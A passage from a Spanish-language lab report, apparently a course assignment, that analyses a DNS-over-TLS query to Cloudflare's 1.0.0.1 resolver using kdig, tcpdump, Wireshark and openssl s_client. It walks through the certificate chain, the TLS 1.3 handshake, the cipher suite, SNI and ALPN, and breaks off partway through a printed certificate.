<li><code>;; DEBUG: TLS, imported 151 system certificates</code></li>
<li><code>+tls-ca</code> hace que <mark>kdig cargue el almacén de <code>CA</code> del sistema, para validar el certificado del servidor.</mark></li>
<li><code>“151 system certificates”</code> es evidencia de que está usando el <code>trust store</code> del sistema para la validación.</li>
</ul>
</li>
<li>
<p><strong>3) Cadena de certificados <code>certificate chain</code> presentada por el servidor:</strong></p>
<ul>
<li>
<p><code>;; DEBUG: TLS, received certificate hierarchy:</code></p>
</li>
<li>
<p>Certificado #1 (leaf / servidor): <code>#1 ... O=Cloudflare, Inc., CN=cloudflare-dns.com</code></p>
<ul>
<li><mark>Este es el certificado del servidor (leaf-hoja).</mark></li>
<li>El comando indica <code>+tls-host=one.one.one.one</code>, pero el <code>CN</code> que imprime <code>kdig</code> es <code>cloudflare-dns.com</code>. Hoy en día lo que se manda para <code>hostname validation</code> suele ser el <code>SAN (Subject Alternative Name)</code>, no el <code>CN</code>. Usaremos el comando <code>openssl s_client</code> para mostrar que el <code>SAN</code> incluye <code>one.one.one.one</code> y/o nombres del servicio DoT de Cloudflare.
<ul>
<li>Usamos el comando <code>openssl s_client</code> para mostrar SANs:<pre class="hljs"><code><div>openssl s_client -connect 1.0.0.1:853 \
-servername one.one.one.one \
&lt;/dev/null 2&gt;/dev/null | \
openssl x509 -noout -subject -issuer -ext subjectAltName


subject=C = US, ST = California, L = San Francisco, O = &quot;Cloudflare, Inc.&quot;, CN = cloudflare-dns.com
issuer=C = US, ST = Texas, L = Houston, O = SSL Corp, CN = SSL.com SSL Intermediate CA ECC R2
X509v3 Subject Alternative Name: 
DNS:cloudflare-dns.com, DNS:*.cloudflare-dns.com, IP Address:1.0.0.1, IP Address:1.1.1.1, IP Address:162.159.36.1,
IP Address:162.159.46.1, IP Address:2606:4700:4700:0:0:0:0:1001, IP Address:2606:4700:4700:0:0:0:0:1111,
IP Address:2606:4700:4700:0:0:0:0:64, IP Address:2606:4700:4700:0:0:0:0:6400, DNS:one.one.one.one
</div></code></pre>
<mark>Confirmamos que kdig está validando el parámetro <code>+tls-host=one.one.one.one</code> contra la lista de nombres y direcciones IP presentes en la extensión <code>Subject Alternative Name - SAN</code>.</mark></li>
</ul>
</li>
<li><code>SHA-256 PIN: ....</code> kdig muestra el pin (hash) de la clave pública/cert para pinning.</li>
</ul>
</li>
<li>
<p>Certificado <code>#2 (intermediate): #2 ... CN=SSL.com SSL Intermediate CA ECC R2</code>: <mark>Es el certificado intermedio (CA intermedia) que firma el leaf.</mark></p>
</li>
<li>
<p>Certificado <code>#3 (root): #3 ... CN=SSL.com Root Certification Authority ECC</code>: <mark>Es el certificado raíz (root CA) del que deriva la confianza.</mark>.</p>
</li>
</ul>
</li>
<li>
<p><strong>4) Pinning y confianza del certificado:</strong></p>
<ul>
<li><code>;; DEBUG: TLS, skipping certificate PIN check</code>: Indica que no se está aplicando pinning, ya que no se ha configurado un pin.</li>
<li><code>;; DEBUG: TLS, The certificate is trusted.</code>: <mark>Esta es la evidencia principal de que la verificación TLS con CA ha sido correcta: el certificado presentado por el servidor es confiable según el almacén del sistema.</mark></li>
</ul>
</li>
<li>
<p><strong>5) Parámetros criptográficos de la sesión TLS:</strong> Esto es muy importante para el análisis del handshake:</p>
<ul>
<li><code>;; TLS session (TLS1.3)-(ECDHE-X25519)-(ECDSA-SECP256R1-SHA256)-(AES-256-GCM)</code>. Esta línea resume lo esencial del canal cifrado:
<ul>
<li><code>TLS1.3</code>: <mark>La sesión negoció TLS 1.3 (moderno; handshake y cifrados distintos a TLS 1.2).</mark></li>
<li><code>ECDHE-X25519</code>: <mark>intercambio de claves efímero con <code>curva X25519</code>, Perfect Forward Secrecy.</mark></li>
<li><code>ECDSA-SECP256R1-SHA256</code>: <mark>Autenticación/firmas con <code>ECDSA</code> (<code>curva P-256</code> / <code>secp256r1</code>) y <code>hash SHA-256</code>.</mark></li>
<li><code>AES-256-GCM</code>: <mark>cifrado simétrico de la sesión con <code>AES-GCM</code> (<code>AEAD</code>), clave 256 bits.</mark></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>6) Interpretación de la respuesta DNS (ya dentro del túnel TLS):</strong></p>
<ul>
<li>
<p>Cabecera DNS:</p>
<ul>
<li><code>-&gt;&gt;HEADER&lt;&lt;- opcode: QUERY; status: NOERROR; id: 33829</code>
<ul>
<li>opcode: QUERY: consulta estándar.</li>
<li>status: NOERROR: resolución correcta.</li>
<li>id: 33829: identificador de transacción DNS (sirve para emparejar request/response).</li>
</ul>
</li>
<li><code>;; Flags: qr rd ra; QUERY: 1; ANSWER: 2; AUTHORITY: 0; ADDITIONAL: 1</code>
<ul>
<li>qr: es respuesta (Query Response).</li>
<li>rd: Recursion Desired (el cliente pidió recursión).</li>
<li>ra: Recursion Available (el resolver la ofrece).</li>
<li>QUERY: 1: una pregunta.</li>
<li>ANSWER: 2: dos registros en la respuesta.</li>
<li>ADDITIONAL: 1: información adicional (aquí se ve que es EDNS).</li>
</ul>
</li>
</ul>
</li>
<li>
<p>EDNS y padding:</p>
<ul>
<li><code>;; EDNS PSEUDOSECTION: ... UDP size: 1232 B ... PADDING: 392 B</code>
<ul>
<li>Aunque estamos usando TCP/TLS, se sigue usando EDNS(0) como mecanismo de extensión.</li>
<li>UDP size 1232 B: tamaño anunciado típico “seguro” (1232) para evitar fragmentación en muchos entornos. Es un valor común en resolvers modernos.</li>
<li>PADDING 392 B: esto es relevante para privacidad: el padding ayuda a homogeneizar tamaños y reducir filtraciones por longitud (traffic analysis). En DoT/DoH se utiliza precisamente para mitigar correlación por tamaño de paquete.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Pregunta y respuesta:</p>
<ul>
<li><code>;; QUESTION SECTION: example.com. IN A</code>:
<ul>
<li>Pregunta: A de example.com.</li>
</ul>
</li>
<li><code>;; ANSWER SECTION: ... 104.18.26.120 .... 104.18.27.120 ...</code>: <mark>Respuesta DNS: Esos dos A records (IPv4).</mark></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>7) Métricas de transferencia y latencia:</strong></p>
<ul>
<li><code>;; Received 468 B</code>: Tamaño total del mensaje DNS (a nivel aplicación DNS) recibido.</li>
<li><code>;; Time 2026-01-27 15:32:39 CET</code>: Marca de tiempo del sistema cuando el kdig fue ejecutado.</li>
<li><code>;; From 1.0.0.1@853(TLS) in 56.7 ms</code>: Confirma de nuevo: servidor 1.0.0.1, puerto 853, sobre TLS.</li>
<li><code>56.7 ms</code>: latencia de la consulta.</li>
</ul>
</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="captura-del-tr%C3%A1fico-de-red"><strong>Captura del tráfico de red</strong></h2>
<p><strong>Analizamos la configuración de red de la máquina virtual:</strong>
<img src="capturas/tarea3-modulo5-configuracion-red.png" alt="Consulta configuración red"><br>
donde:</p>
<ul>
<li><mark>La interfaz de red es la enp0s3.</mark></li>
</ul>
<hr>
<p><strong>Capturamos el tráfico en la interfaz de salida cuando se lanza kdig:</strong></p>
<pre class="hljs"><code><div>sudo tcpdump -ni enp0s3 host 1.0.0.1 and tcp port 853 -w trafico_cloudflare_1.0.0.1.pcap
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-tcpdump.png" alt="Captura trafico tcpdump"><br>
donde:</p>
<ul>
<li>Filtraremos por la IP de Cloudflare 1.0.0.1.</li>
<li>Filtraremos por el puerto 853.</li>
<li>Guardamos el tráfico en un documento pcap.</li>
</ul>
<hr>
<p><strong>En otra terminal, lanzamos varias consultas:</strong></p>
<pre class="hljs"><code><div>kdig -d @1.0.0.1 +tls-ca +tls-host=one.one.one.one example.com
kdig -d @1.0.0.1 +tls-ca +tls-host=one.one.one.one example2.com
kdig -d @1.0.0.1 +tls-ca +tls-host=one.one.one.one cloudflare.com
</div></code></pre>
<hr>
<p><strong>Archivo pcap obtenido:</strong>
<img src="capturas/tarea3-modulo5-pcap.png" alt="Captura trafico pcap"><br>
con este fichero pcap:</p>
<ul>
<li>Demostraremos que el tráfico es TCP/853,</li>
<li>analizaremos el handshake TLS,</li>
<li>y, más adelante, descifraremos este tráfico con dos técnicas del capítulo 7.</li>
</ul>
<hr>
<h2 id="an%C3%A1lisis-completo-de-la-sesi%C3%B3n-tls"><strong>Análisis COMPLETO de la sesión TLS</strong></h2>
<p>Aunque aún no corresponde descrifrar ya que eso se verá en la Fase 2, vamos a realizar un análisis completo de la sesión TLS establecida entre el cliente y el servidor DNS-over-TLS.</p>
<p>Abrimos el archivo pcap obtenido con Wireshak.</p>
<p><strong>Identificamos una sesión - stream - TLS concreta:</strong> Como hemos lanzado 3 veces el comando kdig, habrá varias conexiones TCP, con varios handshakes. Para elegir un handshake concreto, dentro de Wireshark:</p>
<ul>
<li>Vamos a: Statistics → Conversations → TCP</li>
<li>Buscamos conversaciones donde uno de los puertos sea 853 y el destino sea 1.0.0.1
<img src="capturas/tarea3-modulo5-conversations-tcp.png" alt="wireshark conversation tcp"></li>
</ul>
<p><strong>Seleccionamos una conversación, por ejemplo la primera que tiene un Stream ID = 0:</strong><br>
Filtramos por ese stream 0. Se ha seleccionado el <code>Stream TCP</code> 0 para el análisis, el cual contiene el intercambio completo de la primera consulta DNS-over-TLS preguntando por el dominio <code>example.com</code>. En este flujo se observará el Handshake inicial donde el cliente propone las suites de cifrado y el servidor Cloudflare responderá con los 2 A records del dominio consultado.</p>
<p>Aplicamos en Wireshark este filtro para ceñirnos al stream 0:</p>
<pre class="hljs"><code><div>tcp.stream == 0
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-conversations-tcp-stream-0.png" alt="wireshark conversation tcp stream 0"><br>
donde vemos una visión general del flujo de comunicación:</p>
<ul>
<li>
<p>TCP Handshake. <mark>Se comprueba que DoT va por TCP y que se usa el puerto 853:</mark></p>
<ul>
<li>Paquete 1: <code>10.0.2.15:49761 → 1.0.0.1:853 [SYN]</code>.</li>
<li>Paquete 2: <code>1.0.0.1:853 → 10.0.2.15:49761 [SYN, ACK]</code>.</li>
<li>Paquete 3: <code>[ACK]</code>.</li>
</ul>
</li>
<li>
<p>Handshake TLS 1.3 - Inicio del canal cifrado:</p>
<ul>
<li>Paquete 4: <code>TLSv1.3 Client Hello</code> y en el campo “Info” ya aparece: <code>SNI=one.one.one.one</code>. <mark>Esto es una evidencia directa de la extensión SNI (Server Name Indication).</mark></li>
<li>Paquete 6: <code>TLSv1.3 Server Hello, Change Cipher Spec</code>.
<ul>
<li>Wireshark etiqueta la sesión como <code>TLSv1.3</code>, así que <mark>la versión negociada de TLS es TLS 1.3.</mark></li>
<li>Campo tipo <code>Supported Version: TLS 1.3</code>. Suele aparecer como mensaje de compatibilidad.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Tráfico cifrado de aplicación - DNS dentro de TLS. <mark>Es tráfico cifrado, donde va la consulta DNS y la respuesta:</mark></p>
<ul>
<li>Paquete 8.</li>
<li>Paquete 12.</li>
<li>Paquete 13.</li>
<li>Paquete 16.</li>
<li>Paquete 17.</li>
</ul>
</li>
<li>
<p>Cierre de la conexión:</p>
<ul>
<li>Paquete 18: el cliente envía FIN, ACK.</li>
<li>El servidor responde ACK y luego su FIN, ACK</li>
</ul>
</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h3 id="transporte--socket"><strong>Transporte / Socket</strong></h3>
<h4 id="af-inet-%C3%B3-af-inet6"><strong>AF INET ó AF INET6</strong></h4>
<p>Vamos averiguar si usa AF_INET6 que es la familia para el protocolo IPv6 o AF_INET que es la familia para el protocolo IPv4.</p>
<p>Seleccionamos el paquete 4 y en el panel inferior Packet Details:<br>
<img src="capturas/tarea3-modulo5-conversations-tcp-stream-0-af-inet.png" alt="tarea3-modulo5-conversations-tcp-stream-0-af-inet.png">
donde:</p>
<ul>
<li><code>Internet Protocol Version 4</code>.</li>
<li><code>Version: 4</code>.</li>
<li><code>Src: 10.0.2.15</code>.</li>
<li><code>Dst: 1.0.0.1</code>.</li>
</ul>
<p>En el PCAP, los paquetes del flujo DoT muestran Internet Protocol Version 4. Con origen 10.0.2.15 y destino 1.0.0.1. Por tanto, <mark>la familia de direcciones utilizada es IPv4, equivalente a un socket AF_INET.</mark></p>
<p>En el PCAP se observa que la comunicación es sobre IPv4, por lo que la familia de direcciones corresponde a AF_INET, y que el transporte es TCP hacia el puerto 853. Para evidenciar el uso explícito de SOCK_STREAM y las llamadas socket()/connect()/read-write()/close(), se completará usando el comando <code>strace</code> en el apartado de este ejercicio: <a href="#captura-del-tipo-de-socket-que-emplea">Consultas con las herramientas strace y ldd → Captura del tipo de socket que emplea</a></p>
<div style="page-break-before: always;"></div>
<h4 id="tcp-y-puerto-853-dot"><strong>TCP y Puerto 853 (DoT)</strong></h4>
<p>Seleccionamos el primer SYN inicial, que es el primer paquete del stream 0.
<img src="capturas/tarea3-modulo5-6.png" alt="tarea3-modulo5-6">
donde:</p>
<ul>
<li>En la captura vemos especificado: <code>Protocol: TCP</code>.</li>
<li>En Transmission Control Protocol:
<ul>
<li><code>Src Port: 49761</code>: Puerto efímero 49761.</li>
<li><code>Dst Port: 853</code>: Puerto de destino.</li>
<li><code>Flags</code>: SYN (Inicio de Stream): La bandera <code>0x002 (SYN)</code> confirma que es el paquete inicial para establecer el flujo de datos.</li>
</ul>
</li>
</ul>
<p>Se observa que <mark>la sesión DoT se establece sobre TCP, iniciándose con un paquete SYN desde 10.0.2.15:49761 hacia 1.0.0.1:853. El puerto destino 853 identifica el servicio DoT, mientras que 49761 es un puerto efímero del cliente.</mark></p>
<h4 id="tcp-3-way-handsake-synsyn-ackack"><strong>TCP 3-way handsake (SYN/SYN-ACK/ACK)</strong></h4>
<p><img src="capturas/tarea3-modulo5-3way-handshake.png" alt="tarea3-modulo5-3way-handshake.png">
donde:</p>
<ul>
<li>
<p>Paquete 1 (cliente → servidor)</p>
<ul>
<li>10.0.2.15:49761 → 1.0.0.1:853 [SYN]</li>
<li>El cliente inicia la conexión TCP hacia el servicio DoT en el puerto 853.</li>
</ul>
</li>
<li>
<p>Paquete 2 (servidor → cliente)</p>
<ul>
<li>1.0.0.1:853 → 10.0.2.15:49761 [SYN, ACK]</li>
<li>El servidor acepta la petición y responde confirmando (ACK) y sincronizando (SYN).</li>
</ul>
</li>
<li>
<p>Paquete 3 (cliente → servidor)</p>
<ul>
<li>10.0.2.15:49761 → 1.0.0.1:853 [ACK]</li>
<li>El cliente confirma la respuesta del servidor. Con esto queda establecida la conexión TCP.</li>
</ul>
</li>
</ul>
<p><mark>Se observa el establecimiento TCP mediante el 3-way handshake</mark>: SYN (cliente → servidor :853), SYN/ACK (servidor → cliente) y ACK final (cliente → servidor). Tras este intercambio, la sesión TCP queda establecida y puede comenzar el handshake TLS de DoT.</p>
<hr>
<h3 id="handshake-tls"><strong>Handshake TLS</strong></h3>
<h4 id="versi%C3%B3n-negociada-supported-versions"><strong>Versión negociada (supported versions)</strong></h4>
<p>Dentro del paquete 6, en el panel inferior de Packet Details → Versión negociada: TLS 1.3, por supported_versions:<br>
<img src="capturas/tarea3-modulo5-version-tls.png" alt="tarea3-modulo5-conversations-tcp-stream-0-tls.png"></p>
<p>Nota: Aunque vemos <code>Version: TLS 1.2 (0x0303)</code>, la sesión es TLS 1.3. En TLS 1.3, muchos campos muestran un <code>legacy_version 0x0303</code>, que parece TLS 1.2 por compatibilidad. Sin embargo, <mark>la versión real negociada se evidencia en la extensión: <code>Extension: supported_versions TLS 1.3</code>.</mark></p>
<div style="page-break-before: always;"></div>
<h4 id="cipher-suite-negociada"><strong>Cipher suite negociada</strong></h4>
<p>Para ver el nombre de la cipher suite hacemos click en el paquete 6 y en el panel inferior de Packet Details buscaremos Cipher Suite:
<img src="capturas/tarea3-modulo5-conversations-tcp-stream-0-cipher-suite.png" alt="tarea3-modulo5-conversations-tcp-stream-0-cipher-suite"><br>
donde:</p>
<ul>
<li>Cipher Suite: <code>TLS_AES_256_GCM_SHA384 (0x1302)</code></li>
<li><code>AES_256_GCM</code>:
<ul>
<li>Cifrado simétrico <code>AES</code> con clave de 256 bits en modo <code>GCM (AEAD)</code>.</li>
<li><code>GCM</code> aporta confidencialidad + integridad/autenticación, no se necesita una <code>MAC</code> aparte.</li>
</ul>
</li>
<li><code>SHA384</code>: Hash usado en <code>TLS 1.3</code> para derivación de claves <code>HKDF</code> y para el transcript del handshake.</li>
</ul>
<p><strong>En <code>TLS 1.3</code>, la cipher suite define principalmente:</strong></p>
<ul>
<li>El cifrado simétrico, para los datos de aplicación, y</li>
<li>La función hash asociada al <code>HKDF</code> y al transcript del handshake.</li>
</ul>
<p>A diferencia de <code>TLS 1.2</code>, en <code>TLS 1.3</code> la cipher suite ya no incluye en su nombre el intercambio de claves (<code>ECDHE</code>) ni el algoritmo de firma (<code>RSA/ECDSA</code>). Esto se negocia en otros campos, como <code>key_share</code>, <code>supported_groups</code>, y el <code>signature_algorithms</code>.</p>
<p>Resumiendo, en este ServerHello se observa <mark>la <code>cipher suite negociada TLS_AES_256_GCM_SHA384 (0x1302)</code></mark>. En <code>TLS 1.3</code> esta suite indica que:</p>
<ul>
<li><mark>El tráfico de aplicación se cifra con <code>AES-256</code> en modo <code>GCM (AEAD)</code>.</mark></li>
<li><mark>Se emplea <code>SHA-384</code> en la derivación de claves y el transcript del handshake.</mark></li>
<li><mark>El intercambio de claves efímero no forma parte del nombre de la suite en <code>TLS 1.3</code>.</mark> Se evidencia aparte mediante la extensión <code>key_share</code> (que analizamos en el siguiente apartado).</li>
</ul>
<div style="page-break-before: always;"></div>
<h4 id="extensi%C3%B3n-key-share-el-intercambio-de-claves"><strong>Extensión Key share: El intercambio de claves</strong></h4>
<p>Dentro del mismo paquete 6, en el panel inferior de Packet Details:<br>
<img src="capturas/tarea3-modulo5-conversations-tcp-stream-0-key-share.png" alt="tarea3-modulo5-conversations-tcp-stream-0-key-share">
donde:</p>
<ul>
<li><code>Extension: key_share … x25519</code>.</li>
<li><code>Key Share Entry: Group: x25519</code></li>
<li><code>Key Exchange length: 32</code></li>
<li><code>Key Exchange: 553bfa....</code> Corresponde a la clave pública efímera del cliente generada mediante el algoritmo Diffie-Hellman sobre Curva Elíptica (x25519). Este intercambio permite establecer una clave de cifrado simétrico única para la sesión, garantizando que el tráfico DNS permanezca confidencial incluso si las claves a largo plazo del servidor se vieran comprometidas en el futuro. Al ser efímero, cambia por sesión y no depende de la clave privada del servidor.</li>
<li><code>x25519</code> es un grupo de intercambio de claves basado en <code>Curve25519 (ECDH moderno)</code>.</li>
</ul>
<p>Resumiendo: En este paquete 6 se observa: <mark>La extensión <code>key_share</code> con Group: x25519 (Key Exchange length 32), lo que evidencia que el intercambio de claves de TLS 1.3 usa ECDHE/ECDH efímero. Esto proporciona PFS, por lo que la posesión posterior de la clave privada del servidor no permitiría derivar las claves de sesión y descifrar la captura.<mark> Es por ello que necesitaremos técnicas como SSLKEYLOGFILE o proxies TLS para obtener el tráfico en claro.</p>
<div style="page-break-before: always;"></div>
<h4 id="extensi%C3%B3n-sni-el-server-name-indication"><strong>Extensión SNI: El Server Name Indication</strong></h4>
<p>En el paquete 4 <code>ClientHello</code> de la conexión DoT (10.0.2.15 → 1.0.0.1:853), en la columna <code>Info</code> ya vimos: <code>Client Hello (SNI=one.one.one.one)</code>. Vamos a buscar la extensión SNI en el árbol de Wireshark. Seleccionamos este paquete y en el panel Packet Details →  Transport Layer Security → Handshake Protocol: Client Hello → Extensions → server_name
<img src="capturas/tarea3-modulo5-conversations-tcp-stream-0-sni.png" alt="tarea3-modulo5-conversations-tcp-stream-0-sni.png"><br>
donde:</p>
<ul>
<li><code>Extension: server_name (...) name=one.one.one.one</code>.</li>
<li><code>Server Name Indication extension</code></li>
<li><mark><code>Server Name: one.one.one.one</code></mark></li>
<li>SNI - Server Name Indication: es una extensión de TLS donde el cliente envía el hostname del servicio al que quiere conectarse.</li>
<li>Esto permite al servidor escoger el certificado correcto y la configuración TLS, cuando hay varios servicios/hostnames detrás de la misma IP.</li>
<li>En este caso, concuerda con el comando que lanzamos <code>kdig ... +tls-host=one.one.one.one</code>: estamos indicando que el hostname esperado y por tanto el que se valida, es <code>one.one.one.one</code>.</li>
<li>El ClientHello y el SNI, se envían antes de que exista cifrado de aplicación, así que SNI queda visible en el PCAP aunque luego el DNS vaya cifrado dentro de <code>Application Data</code>. Aunque DoT cifra el DNS, ciertos metadatos del handshake, como el SNI, pueden observarse.</li>
</ul>
<p>Resumiendo: <mark>Se confirma mediante el análisis del paquete 4 Client Hello que el cliente envía la extensión Server Name Indication (SNI) con el valor <code>one.one.one.one</code>. Este parámetro es el que permite al servidor seleccionar el certificado criptográfico adecuado para que el proceso de Hostname Validation posterior resulte en una conexión de confianza: <code>Trusted</code>.</mark></p>
<div style="page-break-before: always;"></div>
<h4 id="extensi%C3%B3n-alpn"><strong>Extensión ALPN</strong></h4>
<p>Aplicamos el filtro de wireshark <code>tls.handshake.extension.type == 16</code>, que  filtra la extensión <code>TLS nº16</code>, que es <code>ALPN - Application-Layer Protocol Negotiation</code>. Seleccionamos uno de los paquetes <code>ClientHello</code> → En el panel inferior Packet Details → Transport Layer Security → TLSv1.3 Record Layer: Handshake Protocol: Client Hello → Handshake Protocol: Client Hello → Extensions → Extension: application_layer_protocol_negotiation:
<img src="capturas/tarea3-modulo5-alpn.png" alt="tarea3-modulo5-alpn">
donde:</p>
<ul>
<li><code>ALPN Extension</code>.</li>
<li><code>ALPN string length: 3</code>.</li>
<li><code>ALPN Protocol: dot</code>.</li>
</ul>
<p>Resumiento: <mark>El cliente kdig anuncia ALPN y propone el identificador <code>dot</code>. <code>dot</code> aquí es el <code>Application-Layer Protocol Negotiation identifier</code> para DNS over TLS. Esto significa que, además de usar el puerto 853, el cliente también indica explícitamente por ALPN que la aplicación es DoT.</mark></p>
<h4 id="certificado-del-servidor"><strong>Certificado del servidor</strong></h4>
<p>Recordemos que en TLS 1.3, con un PCAP tal y como capturamos con tcpdump, SIN las claves de sesión, NO podemos hacer un análisis completo del certificado desde Wireshark, porque:</p>
<ul>
<li>En TLS 1.3, el mensaje Certificate va cifrado, se envía después del ServerHello usando claves de handshake.</li>
<li>En el PCAP vemos ClientHello y ServerHello, pero el resto aparece como <code>TLS Application Data</code> (cifrado). Ahí dentro viaja el certificado, pero Wireshark no lo puede abrir sin los secretos de sesión.</li>
</ul>
<p>Es por ello que para seguir haciendo el análisis completo que nos pide el ejercicio, <mark>vamos a usar <code>openssl s_client</code> para obtener: La cadena + La verificación. Mientras kdig nos da la respuesta de la aplicación (DNS), <code>openssl s_client</code> nos permite validar la infraestructura que protege esa respuesta, confirmando que la cadena de certificados es válida y que el hostname solicitado es el legítimo</mark>. Usaremos el siguiente comando:</p>
<pre class="hljs"><code><div>openssl s_client -connect 1.0.0.1:853 \
  -servername one.one.one.one \
  -verify_hostname one.one.one.one \
  -showcerts &lt;/dev/null
</div></code></pre>
<p>Obteniendo:</p>
<pre class="hljs"><code><div>Connecting to 1.0.0.1
CONNECTED(00000003)
depth=2 C=US, ST=Texas, L=Houston, O=SSL Corporation, CN=SSL.com Root Certification Authority ECC
verify return:1
depth=1 C=US, ST=Texas, L=Houston, O=SSL Corp, CN=SSL.com SSL Intermediate CA ECC R2
verify return:1
depth=0 C=US, ST=California, L=San Francisco, O=Cloudflare, Inc., CN=cloudflare-dns.com
verify return:1
---
Certificate chain
 0 s:C=US, ST=California, L=San Francisco, O=Cloudflare, Inc., CN=cloudflare-dns.com
   i:C=US, ST=Texas, L=Houston, O=SSL Corp, CN=SSL.com SSL Intermediate CA ECC R2
   a:PKEY: EC, (prime256v1); sigalg: ecdsa-with-SHA384
   v:NotBefore: Dec 31 19:20:01 2025 GMT; NotAfter: Dec 21 19:20:01 2026 GMT
-----BEGIN CERTIFICATE-----
MIIFgTCCBQigAwIBAgIQTtAzBMRrh6jC61Vp2566DDAKBggqhkjOPQQDAzBvMQsw
CQYDVQQGEwJVUzEOMAwGA1UECAwFVGV4YXMxEDAOBgNVBAcMB0hvdXN0b24xETAP
BgNVBAoMCFNTTCBDb3JwMSswKQYDVQQDDCJTU0wuY29tIFNTTCBJbnRlcm1lZGlh
dGUgQ0EgRUNDIFIyMB4XDTI1MTIzMTE5MjAwMVoXDTI2MTIyMTE5MjAwMVowcjEL
MAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcMDVNhbiBG
cmFuY2lzY28xGTAXBgNVBAoMEENsb3VkZmxhcmUsIEluYy4xGzAZBgNVBAMMEmNs
b3VkZmxhcmUtZG5zLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABGODUCUS
6nJ4GesyR6/BBVKcKitgioROdW2BSEfBx77PhXlsEilbULPM7FChlJ7cRAgHDIAa
k9O9eBF7tqPI6qyjggOBMIIDfTAMBgNVHRMBAf8EAjAAMB8GA1UdIwQYMBaAFA10
Zgpen+Is7NXCXSUEf3Uyuv99MHEGCCsGAQUFBwEBBGUwYzA/BggrBgEFBQcwAoYz
aHR0cDovL2NlcnQuc3NsLmNvbS9TU0xjb20tU3ViQ0EtU1NMLUVDQy0zODQtUjIu
Y2VyMCAGCCsGAQUFBzABhhRodHRwOi8vb2NzcHMuc3NsLmNvbTCBpgYDVR0RBIGe
MIGbghJjbG91ZGZsYXJlLWRucy5jb22CFCouY2xvdWRmbGFyZS1kbnMuY29thwQB
AAABhwQBAQEBhwSinyQBhwSiny4BhxAmBkcARwAAAAAAAAAAABABhxAmBkcARwAA
AAAAAAAAABERhxAmBkcARwAAAAAAAAAAAABkhxAmBkcARwAAAAAAAAAAAGQAgg9v
bmUub25lLm9uZS5vbmUwIwYDVR0gBBwwGjAIBgZngQwBAgIwDgYMKwYBBAGCqTAB
AwECMBMGA1UdJQQMMAoGCCsGAQUFBwMBMEQGA1UdHwQ9MDswOaA3oDWGM2h0dHA6
Ly9jcmxzLnNzbC5jb20vU1NMY29tLVN1YkNBLVNTTC1FQ0MtMzg0LVIyLmNybDAd
BgNVHQ4EFgQULCjsVCC2hgAmVappu7bDZS4W+h8wDgYDVR0PAQH/BAQDAgeAMIIB
fwYKKwYBBAHWeQIEAgSCAW8EggFrAWkAdgDCMX5XRRmjRe5/ON6ykEHrx8IhWiK/
f9W1rXaa2Q5SzQAAAZt144FrAAAEAwBHMEUCIHuQBtNhAb4vKGOEHCF7VVPrLHCJ
zk63LICoCBt00zT1AiEAyWgmqpFEDhYYf7tCfbPHKIFQ0m7FAnfkvAbtdxitYr0A
dwDIo8R/x7OtuTVrAT9qehJt4zpOQ6XGRvmXrTl1mR3PmgAAAZt144HcAAAEAwBI
MEYCIQDK+OeKN052kyl9skxqqvcjM0EnMjAoqfW/w2oDJhe+KwIhANhNTK+gJ6lT
DGHjETKguyIS+BGaEnybtSUbxasJS0BoAHYA2AlVO5RPev/IFhlvlE+Fq7D4/F6H
VSYPFdEucrtFSxQAAAGbdeOCMgAABAMARzBFAiBCcTgVSPtumHiOc5mABE05SNon
hQ+/HKlM/mZ5fujyAgIhALV9R9eZpDKVs4o6+Y8uQYQIshlc6drDSS5Ojen3Q2dH
MAoGCCqGSM49BAMDA2cAMGQCMBsutT9/NO4qecncXj/hWurz/QWBsk7GyrZB71SA
1P7QMBDonFpyfkEQWoiWANfPDwIwEvzlukLPMNPCKWOAcErLN5FR6h4kqMEzd1Lq
Tjux4jSNXWzCsgVjnOxJn4q3MjKF
-----END CERTIFICATE-----
 1 s:C=US, ST=Texas, L=Houston, O=SSL Corp, CN=SSL.com SSL Intermediate CA ECC R2
   i:C=US, ST=Texas, L=Houston, O=SSL Corporation, CN=SSL.com Root Certification Authority ECC
   a:PKEY: EC, (secp384r1); sigalg: ecdsa-with-SHA384
   v:NotBefore: Mar  7 19:42:42 2019 GMT; NotAfter: Mar  3 19:42:42 2034 GMT
-----BEGIN CERTIFICATE-----
MIIDejCCAv+gAwIBAgIQHNcSEt4VENkSgtozEEoQLzAKBggqhkjOPQQDAzB8MQsw
CQYDVQQGEwJVUzEOMAwGA1UECAwFVGV4YXMxEDAOBgNVBAcMB0hvdXN0b24xGDAW
BgNVBAoMD1NTTCBDb3Jwb3JhdGlvbjExMC8GA1UEAwwoU1NMLmNvbSBSb290IENl
cnRpZmljYXRpb24gQXV0aG9yaXR5IEVDQzAeFw0xOTAzMDcxOTQyNDJaFw0zNDAz
MDMxOTQyNDJaMG8xCzAJBgNVBAYTAlVTMQ4wDAYDVQQIDAVUZXhhczEQMA4GA1UE
BwwHSG91c3RvbjERMA8GA1UECgwIU1NMIENvcnAxKzApBgNVBAMMIlNTTC5jb20g
U1NMIEludGVybWVkaWF0ZSBDQSBFQ0MgUjIwdjAQBgcqhkjOPQIBBgUrgQQAIgNi
AASEOWn30uEYKDLFu4sCjFQ1VupFaeMtQjqVWyWSA7+KFljnsVaFQ2hgs4cQk1f/
RQ2INSwdVCYU0i5qsbom20rigUhDh9dM/r6bEZ75eFE899kSCI14xqThYVLPdLEl
+dyjggFRMIIBTTASBgNVHRMBAf8ECDAGAQH/AgEAMB8GA1UdIwQYMBaAFILRhXMw
5zUE044CkvvlpNHEIejNMHgGCCsGAQUFBwEBBGwwajBGBggrBgEFBQcwAoY6aHR0
cDovL3d3dy5zc2wuY29tL3JlcG9zaXRvcnkvU1NMY29tLVJvb3RDQS1FQ0MtMzg0
LVIxLmNydDAgBggrBgEFBQcwAYYUaHR0cDovL29jc3BzLnNzbC5jb20wEQYDVR0g
BAowCDAGBgRVHSAAMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATA7BgNV
HR8ENDAyMDCgLqAshipodHRwOi8vY3Jscy5zc2wuY29tL3NzbC5jb20tZWNjLVJv
